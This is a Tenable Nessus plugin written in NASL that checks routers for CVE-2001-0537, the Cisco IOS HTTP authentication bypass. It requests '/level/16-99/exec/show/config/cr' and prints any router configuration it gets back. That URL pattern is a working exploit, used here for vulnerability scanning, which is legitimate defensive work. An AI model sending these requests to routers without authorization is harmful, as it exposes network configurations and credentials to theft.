#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(10700);
 script_version ("$Revision: 1.36 $");
 script_cve_id("CVE-2001-0537");
 script_bugtraq_id(2936);
 script_osvdb_id(578);

 script_name(english:"Cisco IOS HTTP Configuration Unauthorized Administrative Access");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote router allows authentication to be bypassed and arbitrary 
commands to be executed." );
 script_set_attribute(attribute:"description", value:
"It is possible to execute arbitrary commands on the remote Cisco
router.  An attacker may leverage this issue to disable network access
via this device or lock legitimate users out of the router." );
  # http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20010627-ios-http-level
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?faba55ec" );
 script_set_attribute(attribute:"solution", value:
"Disable the web configuration interface completely." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
script_cwe_id(287);
 script_set_attribute(attribute:"plugin_publication_date", value: "2001/07/02");
 script_cvs_date("$Date: 2016/05/04 18:02:13 $");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/06/27");
 script_set_attribute(attribute:"patch_publication_date", value: "2001/06/27");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/o:cisco:ios");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();
 
 script_summary(english:"Obtains the remote router configuration");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2001-2016 Tenable Network Security, Inc.");
 script_family(english:"CISCO");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
kb   = get_kb_item("www/no404/" + port);

banner = get_http_banner(port:port);
if ( ! banner ) exit(0);
if ( "cisco-IOS" >!< banner && !egrep(pattern:"level [0-9]+ access", string:banner)) exit(0);
 

if ( ! isnull(kb) ) exit(0);

if(get_port_state(port))
{
  for(i=16;i<100;i=i+1)
  {
    url = string("/level/", i, "/exec/show/config/cr");
    res = http_send_recv3(method:"GET", item:url, port:port);
    if (isnull(res)) exit(0);

    if (
      "enable" >< res[2] &&
      "interface" >< res[2] &&
      "ip address" >< res[2]
    )
    {
      info = string(
        "\n",
        "Nessus was able to execute a command on the remote Cisco router and\n",
        "retrieve its configuration file using the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n",
        "\n",
        "Here are its contents :\n",
        "\n",
        res[2]
      );
      security_hole(port:port, extra:info);
      exit(0);
    }
  }
}
